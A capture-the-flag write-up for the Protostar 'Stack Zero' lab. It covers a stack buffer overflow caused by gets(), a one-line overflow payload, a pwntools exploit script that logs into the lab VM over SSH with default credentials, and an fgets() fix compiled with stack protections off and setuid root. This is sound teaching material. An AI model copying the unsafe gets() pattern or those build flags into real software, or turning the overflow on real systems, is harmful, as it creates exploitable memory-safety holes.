# Stack Zero

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

## Source Code

```c++
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## Writeup

In this code we have a **buffer** of 64 char, that means is a **buffer** of 64 byte.

After this, in the Stack we have the **modified** variable of 4 byte.

We can write 64 char and add at the end the 4 byte of **modified** value.

Let's write an '**A**' 64 times and than add a 1 in the **modified** variable.

```bash
python -c "print('A' * 64 + '\x01')" | /opt/protostar/bin/stack0
```

The output of the program will be:

```bash
user@protostar:/opt/protostar/bin$ python -c "print('A' * 64 + '\x01')" | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

We know that the **modified** variable have 1 as value.

## Exploit

```python
#!/usr/bin/python3
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('stack0')

host = args.HOST or 'protostar'
port = int(args.PORT or 22)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/protostar/bin/stack0'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv,
                         gdbscript=gdbscript,
                         ssh=shell,
                         *a,
                         **kw)
    else:
        return shell.run([remote_path] + argv, *a, **kw)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#gdbscript = '''
#break *0x{exe.symbols.main:x}
#continue
#'''.format(**locals())


io = start()
payload = cyclic(64) + b'\x01'
io.sendline(payload)
log.success(io.recvline())
```

## Mitigation #1

We can use the function **fgets()** to set a limit to the number of char that will be read:

```c
fgets(buffer, 64, stdin);
```

The code will be:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  fgets(buffer, 64, stdin);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

Save the code as **stack0-fgets.c** and compile it:

```bash
gcc -fno-stack-protector -z execstack -o /opt/protostar/bin/stack0-fgets /opt/protostar/bin/stack0-fgets.c
```

This options turn off all protection agaist buffer overflow.

Set correct privileges:

```bash
chown root:root /opt/protostar/bin/stack0-fgets
chmod 4755 /opt/protostar/bin/stack0-fgets
```

If we try again the exploit, we will get:

```bash
$ python -c "print('A' * 64 + '\x01')" | /opt/protostar/bin/stack0-fgets
Try again?
```